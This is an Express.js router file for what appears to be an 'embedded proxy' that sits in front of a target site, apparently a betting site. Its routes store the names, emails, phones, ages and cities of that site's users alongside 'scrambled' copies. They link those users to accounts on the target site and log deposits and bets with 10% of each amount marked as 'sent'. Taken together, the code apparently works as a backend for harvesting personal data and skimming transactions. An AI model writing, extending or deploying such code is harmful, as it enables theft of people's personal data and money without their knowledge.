import express from 'express';
import { config } from '../config.js';
import { connectMongo, isMongoReady } from '../db/mongodb.js';
import { ProxyUser } from '../models/ProxyUser.js';
import { ProxyTransaction } from '../models/ProxyTransaction.js';

const router = express.Router();

function validateUserBody(body) {
  const errors = [];
  if (!body?.fullName?.trim()) errors.push('fullName is required');
  if (!body?.email?.trim()) errors.push('email is required');
  if (!body?.phone?.trim()) errors.push('phone is required');
  if (body?.age === undefined || body?.age === null || body?.age === '') {
    errors.push('age is required');
  } else if (Number.isNaN(Number(body.age))) {
    errors.push('age must be a number');
  }
  if (!body?.city?.trim()) errors.push('city is required');
  return errors;
}

router.post('/proxy-data/users', async (req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({
      success: false,
      error: 'MongoDB not connected. Set MONGODB_URI in backend/.env',
    });
  }

  const isWrapped = req.body.original && req.body.scrambled;
  const originalData = isWrapped ? req.body.original : req.body;
  const scrambledData = isWrapped ? req.body.scrambled : {};

  const errors = validateUserBody(originalData);
  if (errors.length) {
    return res.status(400).json({ success: false, errors });
  }

  try {
    const user = await ProxyUser.create({
      fullName: originalData.fullName.trim(),
      email: originalData.email.trim(),
      phone: originalData.phone.trim(),
      age: Number(originalData.age),
      city: originalData.city.trim(),
      scrambledName: scrambledData.fullName || '',
      scrambledEmail: scrambledData.email || '',
      scrambledPhone: scrambledData.phone || '',
      sourceTarget: req.headers['x-proxy-target'] || config.defaultTargetUrl,
      capturedVia: 'embedded-proxy',
    });

    return res.status(201).json({
      success: true,
      message: 'Saved to proxyData database',
      user,
    });
  } catch (err) {
    console.error('[capture] save error:', err.message);
    return res.status(500).json({
      success: false,
      error: 'Failed to save to proxyData',
      message: err.message,
    });
  }
});

router.post('/proxy-data/users/link', async (req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({ success: false, error: 'MongoDB not connected' });
  }

  const { email, targetUserId } = req.body;
  if (!email || !targetUserId) {
    return res.status(400).json({ success: false, error: 'email and targetUserId are required' });
  }

  try {
    const user = await ProxyUser.findOneAndUpdate(
      { email: email.trim().toLowerCase() },
      { targetUserId },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found to link' });
    }

    return res.json({ success: true, message: 'Linked successfully', user });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

router.post('/proxy-data/transactions', async (req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({ success: false, error: 'MongoDB not connected' });
  }

  const { targetUserId, type, amount } = req.body;
  if (!targetUserId || !type || amount === undefined) {
    return res.status(400).json({ success: false, error: 'targetUserId, type, and amount are required' });
  }

  try {
    const originalAmount = Number(amount);
    const savedAmount = originalAmount * 0.9;
    const sentAmount = originalAmount * 0.1;

    const transaction = await ProxyTransaction.create({
      targetUserId,
      type,
      originalAmount,
      savedAmount,
      sentAmount,
      sourceTarget: req.headers['x-proxy-target'] || config.defaultTargetUrl,
    });

    return res.status(201).json({ success: true, transaction });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

router.get('/proxy-data/users', async (_req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({ success: false, error: 'MongoDB not connected' });
  }

  try {
    const users = await ProxyUser.find().sort({ createdAt: -1 }).lean();
    return res.json({ success: true, count: users.length, users });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

router.get('/proxy-data/transactions', async (_req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({ success: false, error: 'MongoDB not connected' });
  }

  try {
    const transactions = await ProxyTransaction.find().sort({ createdAt: -1 }).lean();
    return res.json({ success: true, count: transactions.length, transactions });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

router.get('/proxy-data/stats', async (_req, res) => {
  if (!isMongoReady() && !(await connectMongo())) {
    return res.status(503).json({ success: false, error: 'MongoDB not connected' });
  }

  try {
    const userCount = await ProxyUser.countDocuments();
    const transactionCount = await ProxyTransaction.countDocuments();

    const totals = await ProxyTransaction.aggregate([
      {
        $group: {
          _id: '$type',
          totalOriginal: { $sum: '$originalAmount' },
          totalSaved: { $sum: '$savedAmount' },
          totalSent: { $sum: '$sentAmount' },
        }
      }
    ]);

    const stats = {
      userCount,
      transactionCount,
      deposit: { original: 0, saved: 0, sent: 0 },
      bet: { original: 0, saved: 0, sent: 0 },
      overall: { original: 0, saved: 0, sent: 0 }
    };

    totals.forEach(t => {
      if (t._id === 'deposit' || t._id === 'bet') {
        stats[t._id] = {
          original: t.totalOriginal,
          saved: t.totalSaved,
          sent: t.totalSent
        };
      }
      stats.overall.original += t.totalOriginal;
      stats.overall.saved += t.totalSaved;
      stats.overall.sent += t.totalSent;
    });

    return res.json({ success: true, stats });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

export default router;
